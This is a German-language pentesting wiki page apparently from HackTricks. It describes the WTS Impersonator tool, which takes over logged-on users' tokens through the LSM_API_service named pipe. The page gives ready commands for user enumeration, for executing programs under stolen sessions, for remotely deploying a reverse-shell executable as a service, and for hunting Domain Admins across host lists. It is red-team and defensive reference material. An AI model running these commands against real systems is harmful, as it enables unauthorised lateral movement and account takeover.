# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

Das Tool **WTS Impersonator** nutzt die RPC Named Pipe **"\\pipe\LSM_API_service"**, um angemeldete Benutzer unauffällig aufzulisten und ihre Tokens zu übernehmen, wobei herkömmliche Token-Impersonation-Techniken umgangen werden. Dieser Ansatz ermöglicht nahtlose laterale Bewegungen innerhalb von Netzwerken. Die Innovation hinter dieser Technik wird **Omri Baso** zugeschrieben; seine Arbeit ist auf [GitHub](https://github.com/OmriBaso/WTSImpersonator) verfügbar.<sup>[[1]](#references)</sup>

### Kernfunktionalität

Das Tool arbeitet über eine Abfolge von API-Aufrufen:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Zentrale Module und Verwendung

- **Enumerating Users**: Mit dem Tool ist die lokale und remote Benutzeraufzählung möglich. Dafür stehen je nach Szenario entsprechende Befehle zur Verfügung:

- Lokal:
```bash
.\WTSImpersonator.exe -m enum
```
- Remote durch Angabe einer IP-Adresse oder eines Hostnamens:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: Die Module `exec` und `exec-remote` benötigen einen **Service**-Kontext, um zu funktionieren. Für die lokale Ausführung werden lediglich die ausführbare WTSImpersonator-Datei und ein Befehl benötigt:

- Beispiel für die lokale Befehlsausführung:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe kann verwendet werden, um einen Service-Kontext zu erhalten:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: Dabei wird ähnlich wie bei PsExec.exe remote ein Service erstellt und installiert, wodurch die Ausführung mit den entsprechenden Berechtigungen ermöglicht wird.

- Beispiel für die remote Ausführung:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: Richtet sich gegen bestimmte Benutzer auf mehreren Rechnern und führt Code unter deren Credentials aus. Dies ist besonders nützlich, um Domain Admins mit lokalen Administratorrechten auf mehreren Systemen anzugreifen.
- Anwendungsbeispiel:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
